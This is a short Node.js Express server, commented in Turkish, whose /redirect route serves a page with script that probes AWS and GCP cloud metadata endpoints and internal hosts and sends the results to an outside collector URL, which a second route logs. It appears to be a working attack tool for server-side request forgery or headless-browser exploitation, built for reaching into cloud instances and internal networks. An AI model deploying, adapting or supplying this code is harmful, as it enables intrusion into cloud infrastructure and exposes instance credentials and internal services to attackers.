const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/redirect', (req, res) => {
    console.log("\n--- METADATA & İÇ AĞ TESTİ BAŞLATILIYOR ---");
    
    const htmlPayload = `
    <html>
      <body>
        <h2>Scanning metadata...</h2>
        <script>
          // AWS / Cloud Metadata ve yaygın iç IP adreslerini fetch etmeyi deniyoruz
          const targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://10.25.56.1:80/",
            "http://internal.backend-capital.com/"
          ];

          targets.forEach(target => {
            fetch(target, { 
              mode: 'no-cors',
              headers: {'Metadata-Flavor': 'Google'} // GCP desteği için
            })
            .then(response => {
              // Yanıt alınırsa içeriği veya başarıyı bildir
              fetch('https://collab-67oj.onrender.com/exfiltrate?status=success&target=' + encodeURIComponent(target));
            })
            .catch(error => {
              fetch('https://collab-67oj.onrender.com/exfiltrate?status=error&target=' + encodeURIComponent(target) + '&err=' + encodeURIComponent(error.toString()));
            });
          });
        </script>
      </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(htmlPayload);
});

app.get('/exfiltrate', (req, res) => {
    console.log("\n🔥 --- METADATA TARAMA SONUCU --- 🔥");
    console.log("Query:", req.query);
    return res.status(200).send("OK");
});

app.use((req, res) => {
    return res.status(200).send("OK");
});

app.listen(3000, () => console.log("Metadata test sunucusu hazır!"));
